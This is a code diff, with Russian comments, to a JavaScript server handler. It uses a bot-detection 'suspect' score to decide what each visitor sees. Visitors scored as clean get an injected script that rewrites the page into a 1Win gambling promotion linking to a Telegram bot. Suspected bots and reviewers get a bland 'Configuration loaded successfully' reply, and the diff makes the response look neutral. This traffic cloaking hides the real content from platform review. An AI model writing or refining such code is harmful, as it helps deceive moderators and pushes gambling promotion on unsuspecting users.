@@ -51,7 +51,7 @@ export default async function handler(req, res) {
   }
 }
 
-// Новая функция для обработки request_id
+// Исправленная функция для обработки request_id с правильным форматом JSON
 async function handleRequestId(req, res, requestId) {
   try {
     // Формируем URL для Event API
@@ -90,7 +90,7 @@ async function handleRequestId(req, res, requestId) {
 
     res.setHeader('Content-Type', 'application/json');
 
-    // Логика возврата HTML для suspect score = 0
+    // Логика возврата в зависимости от suspect score
     if (suspect === 0) {
       // HTML-код для обычных пользователей (альтернативный сайт)
       const alternativeHtml = `
@@ -114,7 +114,6 @@ async function handleRequestId(req, res, requestId) {
             <script>
               function startGame() {
                 console.log('Launching 1Win...');
-                // Логика запуска игры
                 window.location.href = 'https://t.me/your_bot_name';
               }
             </script>
@@ -122,19 +121,27 @@ async function handleRequestId(req, res, requestId) {
         </html>
       `;
 
+      // Создаем JavaScript код с автоматическим экранированием через JSON.stringify
+      const initScript = `document.open(); document.write(${JSON.stringify(alternativeHtml)}); document.close();`;
+
+      // Обычные пользователи - показываем альтернативный сайт
       return res.status(200).json({
-        success: true,
-        suspect: suspect,
-        html: alternativeHtml,
-        message: 'Clean user - showing alternative site'
+        status: 'ok',
+        init: initScript
       });
-    } else {
-      // Для подозрительных пользователей
+
+    } else if (suspect >= 1 && suspect <= 100) {
+      // Боты и подозрительные пользователи - обычный ответ
       return res.status(200).json({
-        success: true,
-        suspect: suspect,
-        message: 'Suspicious user detected',
-        action: 'redirect_or_block'
+        status: 'ok',
+        message: 'Configuration loaded successfully'
+      });
+
+    } else {
+      // Неожиданное значение suspect score
+      return res.status(500).json({
+        success: false,
+        error: `Unexpected suspect score: ${suspect}`
       });
     }
 
